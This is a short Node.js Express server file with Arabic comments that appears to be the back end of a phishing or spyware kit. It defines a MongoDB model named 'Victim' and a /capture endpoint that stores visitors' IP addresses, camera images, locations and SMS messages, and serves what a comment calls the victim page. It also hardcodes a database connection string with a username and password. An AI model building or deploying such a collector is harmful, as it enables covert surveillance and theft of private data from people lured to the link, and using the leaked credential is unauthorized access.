const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const app = express();

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

const mongoURI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/myDatabase?retryWrites=true&w=majority";

mongoose.connect(mongoURI).then(() => console.log("✅ Database Ready")).catch(err => console.log(err));

const Victim = mongoose.model('Victim', new mongoose.Schema({
    ip: String,
    image: String,
    location: Object,
    sms: Array,
    date: { type: Date, default: Date.now }
}));

// ملاحظة: غيرنا المسار إلى /capture ليتطابق مع كود الجافاسكريبت لديك
app.post('/capture', async (req, res) => {
    const data = new Victim({
        ip: req.headers['x-forward-for'] || req.socket.remoteAddress,
        image: req.body.image,
        location: req.body.location,
        sms: req.body.sms
    });
    await data.save();
    res.send("Data Synced");
});

// لإظهار صفحة الضحية عند فتح الرابط
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.listen(process.env.PORT || 3000);
